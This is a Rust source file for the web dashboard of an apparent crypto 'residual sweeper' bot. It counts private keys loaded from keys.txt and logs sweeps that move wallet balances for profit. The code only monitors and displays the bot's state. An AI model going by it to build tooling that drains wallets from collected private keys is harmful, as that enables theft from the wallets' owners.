use crate::config::Config;
use crate::rpc::{RpcEndpointSnapshot, RpcFleet};
use crate::storage::Storage;
use axum::extract::State;
use axum::http::header::CONTENT_TYPE;
use axum::response::{Html, IntoResponse};
use axum::routing::get;
use axum::{Json, Router};
use chrono::Utc;
use ethers::types::U256;
use serde::Serialize;
use std::collections::HashMap;
use std::collections::VecDeque;
use std::sync::{Arc, Mutex, RwLock};

#[derive(Clone)]
pub struct DashboardHandle {
    inner: Arc<RwLock<DashboardState>>,
    storage: Storage,
    pending: Arc<Mutex<PendingStorageWrites>>,
}

#[derive(Default)]
struct PendingStorageWrites {
    events: Vec<(String, String)>,
    residual_detections: Vec<PendingResidualDetection>,
    residual_successes: Vec<PendingResidualSuccess>,
    latencies: Vec<PendingLatency>,
    sweeps: Vec<PendingSweepLog>,
}

struct PendingResidualDetection {
    wallet: String,
    asset_class: String,
    total_residual_wei: U256,
    detected_profit_wei: U256,
    is_small_positive: bool,
}

struct PendingLatency {
    stage: String,
    duration_ms: u128,
    wallet: Option<String>,
    note: Option<String>,
}

struct PendingResidualSuccess {
    wallet: String,
    realized_profit_wei: U256,
}

struct PendingSweepLog {
    wallet: String,
    rpc: String,
    status: String,
    detail: Option<String>,
}

#[derive(Debug, Clone, Serialize)]
pub struct DashboardEvent {
    pub at: String,
    pub level: String,
    pub message: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct WalletSnapshot {
    pub address: String,
    pub balance_eth: String,
    pub rpc: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct WalletResidualSnapshot {
    pub wallet: String,
    pub asset_class: String,
    pub detections: u64,
    pub successful_sweeps: u64,
    pub detected_profit_eth: String,
    pub realized_profit_eth: String,
    pub residual_score: u64,
    pub last_seen_at: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct DashboardState {
    pub bot_mode: String,
    pub allow_send: bool,
    pub network: String,
    pub contract: String,
    pub min_balance_eth: String,
    pub min_net_profit_eth: String,
    pub public_fallback_enabled: bool,
    pub scan_interval_ms: u64,
    pub wallet_count: usize,
    pub total_keys_read: usize,
    pub duplicate_keys: usize,
    pub invalid_keys: usize,
    pub last_scan_at: Option<String>,
    pub last_scan_duration_ms: Option<u128>,
    pub sweeps_attempted: u64,
    pub sweeps_succeeded: u64,
    pub sweeps_failed: u64,
    pub hot_wallets: Vec<WalletSnapshot>,
    pub top_residual_wallets: Vec<WalletResidualSnapshot>,
    pub rpc_endpoints: Vec<RpcEndpointSnapshot>,
    pub recent_events: VecDeque<DashboardEvent>,
    pub latency_metrics: Vec<LatencyMetric>,
}

#[derive(Debug, Clone, Serialize)]
pub struct LatencyMetric {
    pub stage: String,
    pub samples: u64,
    pub last_ms: Option<u128>,
    pub avg_ms: Option<u128>,
    pub max_ms: Option<u128>,
}

impl DashboardHandle {
    pub fn new(
        config: &Config,
        wallet_count: usize,
        total_keys_read: usize,
        duplicate_keys: usize,
        invalid_keys: usize,
        storage: Storage,
        rpc_fleet: &RpcFleet,
    ) -> Self {
        let recent_events = storage
            .recent_events(50)
            .map(VecDeque::from)
            .unwrap_or_default();
        let (attempted, succeeded, failed) = storage.sweep_counts().unwrap_or((0, 0, 0));
        let latency_metrics =
            build_latency_metrics(storage.telemetry_summary().unwrap_or_default());
        let top_residual_wallets = storage
            .top_wallet_residuals(10)
            .unwrap_or_default()
            .into_iter()
            .map(
                |(
                    wallet,
                    asset_class,
                    detections,
                    successful_sweeps,
                    detected_profit_wei,
                    realized_profit_wei,
                    last_seen_at,
                )| {
                    let detected = wei_str_to_eth(&detected_profit_wei);
                    let realized = wei_str_to_eth(&realized_profit_wei);
                    let score = detections
                        .saturating_mul(100)
                        .saturating_add(successful_sweeps.saturating_mul(250))
                        .saturating_add((detected * 10_000.0) as u64);
                    WalletResidualSnapshot {
                        wallet,
                        asset_class,
                        detections,
                        successful_sweeps,
                        detected_profit_eth: format!("{detected:.6}"),
                        realized_profit_eth: format!("{realized:.6}"),
                        residual_score: score,
                        last_seen_at,
                    }
                },
            )
            .collect();
        Self {
            inner: Arc::new(RwLock::new(DashboardState {
                bot_mode: config.bot_mode.as_str().to_string(),
                allow_send: config.allow_send,
                network: config.network.clone(),
                contract: format!("{:?}", config.contract),
                min_balance_eth: config.min_balance.to_string(),
                min_net_profit_eth: config.min_net_profit_eth.to_string(),
                public_fallback_enabled: !config.disable_public_fallback,
                scan_interval_ms: config.interval,
                wallet_count,
                total_keys_read,
                duplicate_keys,
                invalid_keys,
                last_scan_at: None,
                last_scan_duration_ms: None,
                sweeps_attempted: attempted,
                sweeps_succeeded: succeeded,
                sweeps_failed: failed,
                hot_wallets: Vec::new(),
                top_residual_wallets,
                rpc_endpoints: rpc_fleet.snapshot(),
                recent_events,
                latency_metrics,
            })),
            storage,
            pending: Arc::new(Mutex::new(PendingStorageWrites::default())),
        }
    }

    pub fn snapshot(&self) -> DashboardState {
        self.inner.read().expect("dashboard state lock").clone()
    }

    pub fn update_scan(
        &self,
        duration_ms: u128,
        hot_wallets: Vec<WalletSnapshot>,
        rpc_endpoints: Vec<RpcEndpointSnapshot>,
    ) {
        let mut state = self.inner.write().expect("dashboard state lock");
        state.last_scan_at = Some(Utc::now().to_rfc3339());
        state.last_scan_duration_ms = Some(duration_ms);
        state.hot_wallets = hot_wallets;
        state.rpc_endpoints = rpc_endpoints;
    }

    pub fn mark_sweep_attempt(&self, wallet: &str, rpc: &str) {
        if let Ok(mut pending) = self.pending.lock() {
            pending.sweeps.push(PendingSweepLog {
                wallet: wallet.to_string(),
                rpc: rpc.to_string(),
                status: "attempt".to_string(),
                detail: None,
            });
        }
        let mut state = self.inner.write().expect("dashboard state lock");
        state.sweeps_attempted += 1;
        push_event(
            &mut state.recent_events,
            "info",
            format!("sweep attempt for {wallet} via {rpc}"),
        );
    }

    pub fn mark_sweep_success(&self, wallet: &str, rpc: &str) {
        if let Ok(mut pending) = self.pending.lock() {
            pending.sweeps.push(PendingSweepLog {
                wallet: wallet.to_string(),
                rpc: rpc.to_string(),
                status: "success".to_string(),
                detail: None,
            });
        }
        let mut state = self.inner.write().expect("dashboard state lock");
        state.sweeps_succeeded += 1;
        push_event(
            &mut state.recent_events,
            "success",
            format!("sweep succeeded for {wallet} via {rpc}"),
        );
    }

    pub fn mark_sweep_success_with_profit(
        &self,
        wallet: &str,
        rpc: &str,
        realized_profit_wei: U256,
    ) {
        if let Ok(mut pending) = self.pending.lock() {
            pending.sweeps.push(PendingSweepLog {
                wallet: wallet.to_string(),
                rpc: rpc.to_string(),
                status: "success".to_string(),
                detail: None,
            });
            pending.residual_successes.push(PendingResidualSuccess {
                wallet: wallet.to_string(),
                realized_profit_wei,
            });
        }
        let mut state = self.inner.write().expect("dashboard state lock");
        state.sweeps_succeeded += 1;
        push_event(
            &mut state.recent_events,
            "success",
            format!("residual sweep succeeded for {wallet} via {rpc}"),
        );
    }

    pub fn mark_sweep_failure(&self, wallet: &str, message: &str) {
        if let Ok(mut pending) = self.pending.lock() {
            pending.sweeps.push(PendingSweepLog {
                wallet: wallet.to_string(),
                rpc: String::new(),
                status: "failed".to_string(),
                detail: Some(message.to_string()),
            });
        }
        let mut state = self.inner.write().expect("dashboard state lock");
        state.sweeps_failed += 1;
        push_event(
            &mut state.recent_events,
            "error",
            format!("sweep failed for {wallet}: {message}"),
        );
    }

    pub fn event(&self, level: &str, message: impl Into<String>) {
        let message = message.into();
        if let Ok(mut pending) = self.pending.lock() {
            pending.events.push((level.to_string(), message.clone()));
        }
        let mut state = self.inner.write().expect("dashboard state lock");
        push_event(&mut state.recent_events, level, message);
    }

    pub fn record_residual_detection(
        &self,
        wallet: &str,
        asset_class: &str,
        total_residual_wei: U256,
        detected_profit_wei: U256,
        is_small_positive: bool,
    ) {
        if let Ok(mut pending) = self.pending.lock() {
            pending.residual_detections.push(PendingResidualDetection {
                wallet: wallet.to_string(),
                asset_class: asset_class.to_string(),
                total_residual_wei,
                detected_profit_wei,
                is_small_positive,
            });
        }
    }

    pub fn record_latency(
        &self,
        stage: &str,
        duration_ms: u128,
        wallet: Option<&str>,
        note: Option<&str>,
    ) {
        if let Ok(mut pending) = self.pending.lock() {
            pending.latencies.push(PendingLatency {
                stage: stage.to_string(),
                duration_ms,
                wallet: wallet.map(str::to_string),
                note: note.map(str::to_string),
            });
        }
        let mut state = self.inner.write().expect("dashboard state lock");
        upsert_latency_metric(&mut state.latency_metrics, stage, duration_ms);
    }

    fn load_top_residual_wallets(&self) -> Vec<WalletResidualSnapshot> {
        self.storage
            .top_wallet_residuals(10)
            .unwrap_or_default()
            .into_iter()
            .map(
                |(
                    wallet,
                    asset_class,
                    detections,
                    successful_sweeps,
                    detected_profit_wei,
                    realized_profit_wei,
                    last_seen_at,
                )| {
                    let detected = wei_str_to_eth(&detected_profit_wei);
                    let realized = wei_str_to_eth(&realized_profit_wei);
                    let score = detections
                        .saturating_mul(100)
                        .saturating_add(successful_sweeps.saturating_mul(250))
                        .saturating_add((detected * 10_000.0) as u64);
                    WalletResidualSnapshot {
                        wallet,
                        asset_class,
                        detections,
                        successful_sweeps,
                        detected_profit_eth: format!("{detected:.6}"),
                        realized_profit_eth: format!("{realized:.6}"),
                        residual_score: score,
                        last_seen_at,
                    }
                },
            )
            .collect()
    }

    pub fn refresh_residual_rankings(&self) {
        let top_residual_wallets = self.load_top_residual_wallets();
        let mut state = self.inner.write().expect("dashboard state lock");
        state.top_residual_wallets = top_residual_wallets;
    }

    pub fn flush_storage_buffers(&self) {
        let pending = {
            let Ok(mut pending) = self.pending.lock() else {
                return;
            };
            std::mem::take(&mut *pending)
        };

        for (level, message) in pending.events {
            self.storage.log_event(&level, &message);
        }

        for detection in pending.residual_detections {
            self.storage.record_residual_detection(
                &detection.wallet,
                &detection.asset_class,
                &detection.total_residual_wei.to_string(),
                &detection.detected_profit_wei.to_string(),
                detection.is_small_positive,
            );
        }

        for success in pending.residual_successes {
            self.storage
                .record_residual_success(&success.wallet, &success.realized_profit_wei.to_string());
        }

        for latency in pending.latencies {
            self.storage.log_telemetry(
                &latency.stage,
                latency.duration_ms,
                latency.wallet.as_deref(),
                latency.note.as_deref(),
            );
        }

        for sweep in pending.sweeps {
            self.storage.log_sweep(
                &sweep.wallet,
                &sweep.rpc,
                &sweep.status,
                sweep.detail.as_deref(),
            );
        }
    }
}

pub async fn run_server(
    dashboard: DashboardHandle,
    bind_addr: std::net::SocketAddr,
) -> Result<(), Box<dyn std::error::Error>> {
    let app = Router::new()
        .route("/", get(index))
        .route("/api/status", get(status))
        .with_state(dashboard);

    let listener = tokio::net::TcpListener::bind(bind_addr).await?;
    axum::serve(listener, app).await?;
    Ok(())
}

async fn index() -> impl IntoResponse {
    (
        [(CONTENT_TYPE, "text/html; charset=utf-8")],
        Html(INDEX_HTML),
    )
}

async fn status(State(dashboard): State<DashboardHandle>) -> Json<DashboardState> {
    Json(dashboard.snapshot())
}

fn push_event(queue: &mut VecDeque<DashboardEvent>, level: &str, message: String) {
    queue.push_front(DashboardEvent {
        at: Utc::now().to_rfc3339(),
        level: level.to_string(),
        message,
    });
    while queue.len() > 50 {
        queue.pop_back();
    }
}

fn build_latency_metrics(summary: HashMap<String, (u64, u128, u128, u128)>) -> Vec<LatencyMetric> {
    let mut metrics = Vec::new();
    for stage in [
        "block_fetch",
        "scan_cycle",
        "enqueue_latency",
        "queue_wait",
        "tx_prepare",
        "bundle_attempt",
    ] {
        let metric = summary
            .get(stage)
            .copied()
            .map(|(samples, last_ms, avg_ms, max_ms)| LatencyMetric {
                stage: stage.to_string(),
                samples,
                last_ms: Some(last_ms),
                avg_ms: Some(avg_ms),
                max_ms: Some(max_ms),
            });
        metrics.push(metric.unwrap_or(LatencyMetric {
            stage: stage.to_string(),
            samples: 0,
            last_ms: None,
            avg_ms: None,
            max_ms: None,
        }));
    }
    metrics
}

fn upsert_latency_metric(metrics: &mut Vec<LatencyMetric>, stage: &str, duration_ms: u128) {
    if let Some(metric) = metrics.iter_mut().find(|metric| metric.stage == stage) {
        metric.samples = metric.samples.saturating_add(1);
        metric.last_ms = Some(duration_ms);
        metric.avg_ms = Some(match metric.avg_ms {
            Some(previous) => {
                ((previous * (metric.samples as u128 - 1)) + duration_ms) / metric.samples as u128
            }
            None => duration_ms,
        });
        metric.max_ms = Some(metric.max_ms.unwrap_or(duration_ms).max(duration_ms));
        return;
    }

    metrics.push(LatencyMetric {
        stage: stage.to_string(),
        samples: 1,
        last_ms: Some(duration_ms),
        avg_ms: Some(duration_ms),
        max_ms: Some(duration_ms),
    });
}

const INDEX_HTML: &str = r#"<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Flash Bot Dashboard</title>
  <style>
    :root {
      --bg: #0e141b;
      --panel: #17212b;
      --panel-2: #1f2c39;
      --text: #edf3f8;
      --muted: #96a7b7;
      --line: #2a3b4c;
      --accent: #42c58a;
      --warn: #f0b24a;
      --danger: #ef6b73;
      --mono: "Consolas", "SFMono-Regular", monospace;
      --sans: "Segoe UI", "Helvetica Neue", sans-serif;
    }
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: var(--sans);
      background:
        radial-gradient(circle at top right, rgba(66,197,138,.12), transparent 28%),
        linear-gradient(180deg, #0b1117, var(--bg));
      color: var(--text);
    }
    .wrap {
      max-width: 1240px;
      margin: 0 auto;
      padding: 28px 20px 40px;
    }
    h1 { margin: 0 0 6px; font-size: 30px; }
    .sub { color: var(--muted); margin-bottom: 22px; }
    .grid {
      display: grid;
      grid-template-columns: repeat(4, minmax(0, 1fr));
      gap: 14px;
      margin-bottom: 14px;
    }
    .panel {
      background: linear-gradient(180deg, rgba(255,255,255,.02), transparent), var(--panel);
      border: 1px solid var(--line);
      border-radius: 16px;
      padding: 16px;
      box-shadow: 0 12px 30px rgba(0,0,0,.22);
    }
    .metric-label { color: var(--muted); font-size: 12px; text-transform: uppercase; letter-spacing: .08em; }
    .metric-value { font-size: 28px; font-weight: 700; margin-top: 8px; }
    .layout {
      display: grid;
      grid-template-columns: 1.35fr 1fr;
      gap: 14px;
      margin-top: 14px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      font-size: 14px;
    }
    th, td {
      padding: 10px 8px;
      border-bottom: 1px solid var(--line);
      text-align: left;
      vertical-align: top;
    }
    th { color: var(--muted); font-size: 12px; text-transform: uppercase; }
    .badge {
      display: inline-block;
      padding: 3px 8px;
      border-radius: 999px;
      background: var(--panel-2);
      border: 1px solid var(--line);
      font-size: 12px;
    }
    .events {
      display: grid;
      gap: 10px;
      max-height: 540px;
      overflow: auto;
    }
    .event {
      border: 1px solid var(--line);
      border-radius: 12px;
      padding: 12px;
      background: rgba(255,255,255,.015);
      font-family: var(--mono);
      font-size: 12px;
    }
    .event small { color: var(--muted); display: block; margin-bottom: 6px; }
    .success { color: var(--accent); }
    .error { color: var(--danger); }
    .warn { color: var(--warn); }
    .ok { color: var(--accent); }
    .muted { color: var(--muted); }
    .mono { font-family: var(--mono); }
    @media (max-width: 980px) {
      .grid { grid-template-columns: repeat(2, minmax(0, 1fr)); }
      .layout { grid-template-columns: 1fr; }
    }
    @media (max-width: 640px) {
      .grid { grid-template-columns: 1fr; }
    }
  </style>
</head>
<body>
  <div class="wrap">
    <h1>Corporate Residual Sweeper</h1>
    <div class="sub" id="sub">Loading status...</div>

    <div class="grid">
      <div class="panel"><div class="metric-label">Network</div><div class="metric-value" id="network">-</div></div>
      <div class="panel"><div class="metric-label">Mode</div><div class="metric-value" id="mode">-</div></div>
      <div class="panel"><div class="metric-label">Hot Wallets</div><div class="metric-value" id="hot">-</div></div>
      <div class="panel"><div class="metric-label">Last Scan</div><div class="metric-value" id="scan">-</div></div>
    </div>

    <div class="grid">
      <div class="panel"><div class="metric-label">Total Keys</div><div class="metric-value" id="total-keys">-</div></div>
      <div class="panel"><div class="metric-label">Duplicates</div><div class="metric-value" id="duplicates">-</div></div>
      <div class="panel"><div class="metric-label">Invalid</div><div class="metric-value" id="invalid">-</div></div>
      <div class="panel"><div class="metric-label">Contract</div><div class="metric-value mono" style="font-size:14px;word-break:break-all" id="contract">-</div></div>
    </div>

    <div class="grid">
      <div class="panel"><div class="metric-label">Unique Wallets</div><div class="metric-value" id="wallets">-</div></div>
      <div class="panel"><div class="metric-label">Sweeps Attempted</div><div class="metric-value" id="attempted">-</div></div>
      <div class="panel"><div class="metric-label">Sweeps Succeeded</div><div class="metric-value" id="success">-</div></div>
      <div class="panel"><div class="metric-label">Sweeps Failed</div><div class="metric-value" id="failed">-</div></div>
    </div>

    <div class="grid">
      <div class="panel"><div class="metric-label">Allow Send</div><div class="metric-value" id="allow-send">-</div></div>
      <div class="panel"><div class="metric-label">Queue Wait Avg</div><div class="metric-value" id="queue-wait-avg">-</div></div>
      <div class="panel"><div class="metric-label">TX Prepare Avg</div><div class="metric-value" id="prepare-avg">-</div></div>
      <div class="panel"><div class="metric-label">Bundle Attempt Avg</div><div class="metric-value" id="bundle-avg">-</div></div>
    </div>

    <div class="layout">
      <div class="panel">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
          <strong>RPC Fleet</strong>
          <span class="badge" id="min-balance">-</span>
        </div>
        <table>
          <thead>
            <tr><th>Name</th><th>Kind</th><th>Health</th><th>Latency</th><th>Block</th><th>429</th><th>Timeout</th><th>Stale</th><th>Cooldown</th></tr>
          </thead>
          <tbody id="rpc-body"></tbody>
        </table>
      </div>

      <div class="panel">
        <strong>Recent Events</strong>
        <div class="events" id="events" style="margin-top:12px"></div>
      </div>
    </div>

    <div class="layout">
      <div class="panel">
        <strong>Active Residual Candidates</strong>
        <table style="margin-top:12px">
          <thead>
            <tr><th>Wallet</th><th>Balance</th><th>RPC</th></tr>
          </thead>
          <tbody id="wallet-body"></tbody>
        </table>
      </div>
      <div class="panel">
        <strong>Monitor Settings</strong>
        <table style="margin-top:12px">
          <tbody>
            <tr><td>Scan interval</td><td id="interval">-</td></tr>
            <tr><td>Last scan at</td><td id="last-scan-at">-</td></tr>
            <tr><td>Scan input</td><td class="mono">keys.txt</td></tr>
            <tr><td>Dashboard refresh</td><td>2s</td></tr>
          </tbody>
        </table>
      </div>
    </div>

    <div class="layout">
      <div class="panel">
        <strong>Residual Recurrence</strong>
        <table style="margin-top:12px">
          <thead>
            <tr><th>Wallet</th><th>Class</th><th>Detect</th><th>Success</th><th>Detected Profit</th><th>Realized</th><th>Score</th></tr>
          </thead>
          <tbody id="residual-body"></tbody>
        </table>
      </div>
      <div class="panel">
        <strong>Residual Policy</strong>
        <table style="margin-top:12px">
          <tbody>
            <tr><td>Min safety reserve</td><td id="policy-min-balance">-</td></tr>
            <tr><td>Min net profit</td><td id="policy-min-profit">-</td></tr>
            <tr><td>Public fallback</td><td id="policy-fallback">-</td></tr>
            <tr><td>Residual model</td><td>value_liquido > margem</td></tr>
          </tbody>
        </table>
      </div>
    </div>

    <div class="layout">
      <div class="panel">
        <strong>Latency Pipeline</strong>
        <table style="margin-top:12px">
          <thead>
            <tr><th>Stage</th><th>Samples</th><th>Last</th><th>Avg</th><th>Max</th></tr>
          </thead>
          <tbody id="latency-body"></tbody>
        </table>
      </div>
      <div class="panel">
        <strong>Operational Readiness</strong>
        <table style="margin-top:12px">
          <tbody>
            <tr><td>Current mode</td><td id="readiness-mode">-</td></tr>
            <tr><td>Send path</td><td id="readiness-send">-</td></tr>
            <tr><td>RPC endpoints</td><td id="readiness-rpc">-</td></tr>
            <tr><td>Wallets loaded</td><td id="readiness-wallets">-</td></tr>
          </tbody>
        </table>
      </div>
    </div>
  </div>

  <script>
    async function refresh() {
      const res = await fetch('/api/status', { cache: 'no-store' });
      const data = await res.json();
      const metricByStage = Object.fromEntries(data.latency_metrics.map(item => [item.stage, item]));

      document.getElementById('sub').textContent = `Residual monitor for ${data.network} | ${data.rpc_endpoints.length} RPC endpoints`;
      document.getElementById('network').textContent = data.network;
      document.getElementById('mode').textContent = data.bot_mode;
      document.getElementById('wallets').textContent = data.wallet_count;
      document.getElementById('hot').textContent = data.hot_wallets.length;
      document.getElementById('scan').textContent = data.last_scan_duration_ms ? `${data.last_scan_duration_ms} ms` : '-';
      document.getElementById('allow-send').textContent = data.allow_send ? 'enabled' : 'blocked';
      document.getElementById('queue-wait-avg').textContent = metricByStage.queue_wait?.avg_ms ? `${metricByStage.queue_wait.avg_ms} ms` : '-';
      document.getElementById('prepare-avg').textContent = metricByStage.tx_prepare?.avg_ms ? `${metricByStage.tx_prepare.avg_ms} ms` : '-';
      document.getElementById('bundle-avg').textContent = metricByStage.bundle_attempt?.avg_ms ? `${metricByStage.bundle_attempt.avg_ms} ms` : '-';
      document.getElementById('total-keys').textContent = data.total_keys_read;
      document.getElementById('duplicates').textContent = data.duplicate_keys;
      document.getElementById('invalid').textContent = data.invalid_keys;
      document.getElementById('attempted').textContent = data.sweeps_attempted;
      document.getElementById('success').textContent = data.sweeps_succeeded;
      document.getElementById('failed').textContent = data.sweeps_failed;
      document.getElementById('contract').textContent = data.contract;
      document.getElementById('min-balance').textContent = `Min balance ${data.min_balance_eth} ETH`;
      document.getElementById('policy-min-balance').textContent = `${data.min_balance_eth} ETH`;
      document.getElementById('policy-min-profit').textContent = `${data.min_net_profit_eth} ETH`;
      document.getElementById('policy-fallback').textContent = data.public_fallback_enabled ? 'enabled' : 'disabled';
      document.getElementById('interval').textContent = `${data.scan_interval_ms} ms`;
      document.getElementById('last-scan-at').textContent = data.last_scan_at || '-';
      document.getElementById('readiness-mode').textContent = data.bot_mode;
      document.getElementById('readiness-send').textContent = data.allow_send ? 'send enabled' : 'send blocked';
      document.getElementById('readiness-rpc').textContent = `${data.rpc_endpoints.length} endpoints`;
      document.getElementById('readiness-wallets').textContent = `${data.wallet_count} wallets`;

      document.getElementById('rpc-body').innerHTML = data.rpc_endpoints.map(item => {
        const health = item.cooldown_remaining_secs
          ? '<span class="badge error">cooldown</span>'
          : item.stale_failures > 0 || (item.block_age_secs && item.block_age_secs > 30)
          ? '<span class="badge warn">stale</span>'
          : '<span class="badge ok">healthy</span>';
        const block = item.last_block
          ? `${item.last_block}${item.block_age_secs ? ` <span class="muted">(${item.block_age_secs}s)</span>` : ''}`
          : '-';
        return `
        <tr>
          <td>${item.name}</td>
          <td><span class="badge">${item.kind}</span></td>
          <td>${health}</td>
          <td>${item.avg_latency_ms ? item.avg_latency_ms + ' ms' : '-'}</td>
          <td>${block}</td>
          <td>${item.rate_limit_failures}</td>
          <td>${item.timeout_failures}</td>
          <td>${item.stale_failures}</td>
          <td>${item.cooldown_remaining_secs ? item.cooldown_remaining_secs + ' s' : '-'}</td>
        </tr>
      `}).join('');

      document.getElementById('wallet-body').innerHTML = data.hot_wallets.length
        ? data.hot_wallets.map(item => `
          <tr>
            <td class="mono">${item.address}</td>
            <td>${item.balance_eth}</td>
            <td>${item.rpc}</td>
          </tr>
        `).join('')
        : '<tr><td colspan="3">No positive residual candidates</td></tr>';

      document.getElementById('residual-body').innerHTML = data.top_residual_wallets.length
        ? data.top_residual_wallets.map(item => `
          <tr>
            <td class="mono">${item.wallet}</td>
            <td>${item.asset_class}</td>
            <td>${item.detections}</td>
            <td>${item.successful_sweeps}</td>
            <td>${item.detected_profit_eth} ETH</td>
            <td>${item.realized_profit_eth} ETH</td>
            <td>${item.residual_score}</td>
          </tr>
        `).join('')
        : '<tr><td colspan="7">No residual recurrence data yet</td></tr>';

      document.getElementById('events').innerHTML = data.recent_events.length
        ? data.recent_events.map(item => `
          <div class="event">
            <small>${item.at}</small>
            <div class="${item.level === 'success' ? 'success' : item.level === 'error' ? 'error' : item.level === 'warn' ? 'warn' : ''}">${item.message}</div>
          </div>
        `).join('')
        : '<div class="event">No events yet</div>';

      document.getElementById('latency-body').innerHTML = data.latency_metrics.length
        ? data.latency_metrics.map(item => `
          <tr>
            <td>${item.stage}</td>
            <td>${item.samples}</td>
            <td>${item.last_ms ? item.last_ms + ' ms' : '-'}</td>
            <td>${item.avg_ms ? item.avg_ms + ' ms' : '-'}</td>
            <td>${item.max_ms ? item.max_ms + ' ms' : '-'}</td>
          </tr>
        `).join('')
        : '<tr><td colspan="5">No telemetry yet</td></tr>';
    }

    refresh().catch(console.error);
    setInterval(() => refresh().catch(console.error), 2000);
  </script>
</body>
</html>"#;

fn wei_str_to_eth(value: &str) -> f64 {
    value.parse::<f64>().unwrap_or(0.0) / 1e18
}
